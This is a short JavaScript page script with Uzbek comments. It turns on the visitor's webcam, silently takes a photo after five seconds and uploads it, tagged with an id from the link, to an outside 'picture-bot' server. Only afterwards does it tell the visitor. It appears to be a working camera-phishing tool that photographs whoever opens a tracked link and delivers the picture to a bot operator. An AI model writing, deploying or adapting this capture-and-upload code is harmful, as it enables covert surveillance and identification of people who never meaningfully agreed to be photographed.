const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");
const retryButton = document.getElementById("retry");
const errorMessage = document.getElementById("error");

// Kamera ishga tushirish
function startCamera() {
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            video.srcObject = stream;
            setTimeout(captureImage, 5000); // 5 soniyada rasmga oladi
        })
        .catch(err => {
            console.error("Kameraga ruxsat berilmadi!", err);
            errorMessage.innerText = "Kameraga ruxsat berilmadi!";
            retryButton.style.display = "block";
        });
}

// Rasmni olish va serverga yuborish
function captureImage() {
    if (!video.srcObject) {
        console.error("Kamera yoqilmagan!");
        return;
    }

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const imageData = canvas.toDataURL("image/png");
    const userId = getQueryParam("id");

    fetch("https://picture-bot.onrender.com//upload", {
        method: "POST",
        mode: "cors",
        credentials: "include", 
        headers: { 
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ image: imageData, userId })
    })
    .then(res => {
        if (!res.ok) throw new Error(`Serverdan noto‘g‘ri javob keldi! Status: ${res.status}`);
        return res.json();
    })
    .then(data => {
        document.body.innerHTML = "<h1>Sizning rasmingiz botga yuborildi!</h1>";
    })
    .catch(err => {
        console.error("Xatolik:", err);
        errorMessage.innerText = `Xatolik yuz berdi: ${err.message}`;
        retryButton.style.display = "block";
    });
}

// URL'dan query parametr olish
function getQueryParam(param) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(param);
}

// Qayta urinish tugmasi
retryButton.addEventListener("click", () => {
    location.reload();
});

startCamera();
